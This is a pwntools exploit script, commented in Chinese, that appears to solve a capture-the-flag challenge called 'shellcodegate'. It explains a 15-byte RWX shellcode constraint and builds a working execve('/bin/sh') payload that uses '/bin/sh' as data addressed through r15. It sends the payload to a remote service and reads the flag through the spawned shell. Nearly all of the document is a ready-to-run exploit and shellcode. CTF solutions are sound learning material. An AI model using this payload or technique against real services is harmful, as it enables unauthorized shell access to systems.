#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
shellcodegate 解题脚本
================================
题目逻辑:
1. mmap(0, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE|ANON, -1, 0) -> RWX 页
2. read(0, mmap, 0xf)  # 最多读入 15 字节
3. clean_and_jump(mmap):
      r15 = mmap
      push mmap+8            # 返回地址 = 第 8 字节处
      xor rax/rbx/rcx/rdx/rsi/rdi/r8~r14   # 清空几乎所有寄存器(r15/rsp 除外)
      ret                    # 跳到 mmap+8

=> 执行流从偏移 8 开始, 只有 7 字节可用; 偏移 0~7 的 8 字节永远不执行,
   但可以被当作"数据"使用 (r15 正好指向 mmap 基址)。

思路:
   把前 8 字节当作字符串 "/bin/sh\\x00", 让 r15 直接指向它;
   后 7 字节用 execve 起 shell:
       mov rdi, r15   ; rdi = "/bin/sh"              (4c 89 ff)
       mov al, 0x3b   ; rax = 59 = SYS_execve          (b0 3b)
       syscall        ; execve("/bin/sh", NULL, NULL)  (0f 05)
   rsi/rdx 已被清空为 0, 正好作为 argv=NULL / envp=NULL。
"""

from pwn import *

context.arch = "amd64"
context.os = "linux"

# 15 字节 payload (硬编码, 保证跨平台正确)
payload = b"\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # 偏移 0~7 : "/bin/sh\0" (数据, r15 指向这里)
payload += b"\x4c\x89\xff"                     # 偏移 8~10: mov rdi, r15
payload += b"\xb0\x3b"                         # 偏移 11~12: mov al, 0x3b  (SYS_execve)
payload += b"\x0f\x05"                         # 偏移 13~14: syscall

assert len(payload) == 15, len(payload)

# ---- 本地调试 ----
LOCAL = False
if LOCAL:
    p = process("./pwn")
else:
    # 远程: 把 HOST/PORT 改成题目给的地址
    HOST, PORT = "127.0.0.1", 9999
    p = remote(HOST, PORT)

p.recvuntil(b"Submit your shellcode:")
p.send(payload)          # 直接发送 15 字节, 不加换行

p.sendline(b"cat /flag; cat flag.txt; id")  # 拿到 shell 后读 flag
p.interactive()
